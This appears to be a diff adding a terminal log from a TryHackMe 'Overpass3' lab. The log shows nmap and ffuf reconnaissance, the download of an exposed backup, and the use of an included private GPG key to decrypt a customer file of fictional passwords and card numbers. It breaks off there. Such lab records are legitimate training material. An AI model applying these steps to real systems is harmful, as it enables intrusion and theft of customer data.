@@ -1,0 +1,114 @@
+┌──────────────────────────────────────────────────────────────┐
+│   ______                          ____          _         __ │
+│  / ____/_____ ___   ___   ____   / __ \ ____   (_)____   / /_│
+│ / / __ / ___// _ \ / _ \ / __ \ / /_/ // __ \ / // __ \ / __/│
+│/ /_/ // /   /  __//  __// / / // ____// /_/ // // / / // /_  │
+│\____//_/    \___/ \___//_/ /_//_/     \____//_//_/ /_/ \__/  │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+┌──(kali㉿kali)-[~]
+└─$ Documents/TryHackMe/ && mkdir Overpass3 && Overpass3
+                                                                                                                  
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Overpass3]
+└─$ nmap -sC -sV -Pn 10.10.220.231 -oN nmap
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 14:07 EST
+Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 9.05% done; ETC: 14:09 (0:01:40 remaining)
+Nmap scan report for 10.10.254.5
+Host is up (0.64s latency).
+Not shown: 911 filtered tcp ports (no-response), 86 filtered tcp ports (host-unreach)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
+|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
+|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.37 ((centos))
+|_http-title: Overpass Hosting
+|_http-server-header: Apache/2.4.37 (centos)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 217.34 seconds
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Overpass3]
+└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.10.220.231/FUZZ -c                                
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.254.5/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+backups                 [Status: 301, Size: 235, Words: 14, Lines: 8]
+                        [Status: 200, Size: 1770, Words: 443, Lines: 37]
+:: Progress: [26584/26584] :: Job [1/1] :: 259 req/sec :: Duration: [0:03:57] :: Errors: 242 ::
+
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Overpass3]
+└─$ wget http://10.10.220.231/backups/backup.zip                           
+--2021-12-20 16:49:31--  http://10.10.220.231/backups/backup.zip
+Connecting to 10.10.220.231:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13353 (13K) [application/zip]
+Saving to: ‘backup.zip’
+
+backup.zip                   100%[============================================>]  13.04K  27.9KB/s    in 0.5s    
+
+2021-12-20 16:50:37 (27.9 KB/s) - ‘backup.zip’ saved [13353/13353]
+
+                                                                                                                  
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Overpass3]
+└─$ ls
+backup.zip  nmap
+                                                                                                                  
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Overpass3]
+└─$ unzip backup.zip
+Archive:  backup.zip
+ extracting: CustomerDetails.xlsx.gpg  
+  inflating: priv.key                
+                                                                                                                  
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Overpass3]
+└─$ ls
+backup.zip  CustomerDetails.xlsx.gpg  nmap  priv.key
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Overpass3]
+└─$ gpg --import priv.key 
+gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
+gpg: key C9AE71AB3180BC08: secret key imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+                                                                                                                  
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Overpass3]
+└─$ gpg --decrypt-file CustomerDetails.xlsx.gpg 
+gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
+      "Paradox <paradox@overpass.thm>"
+                                                                                                                  
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Overpass3]
+└─$ ls
+backup.zip  CustomerDetails.xlsx  CustomerDetails.xlsx.gpg  nmap  priv.key
+
+Customer Name 		Username 	Password 		Credit card number 	CVC
+Par. A. Doxx 		paradox 	ShibesAreGreat123 	4111 1111 4555 1142 	432
+0day Montgomery 	0day 		OllieIsTheBestDog 	5555 3412 4444 1115 	642
+Muir Land 		muirlandoracle 	A11D0gsAreAw3s0me 	5103 2219 1119 9245 	737 
+
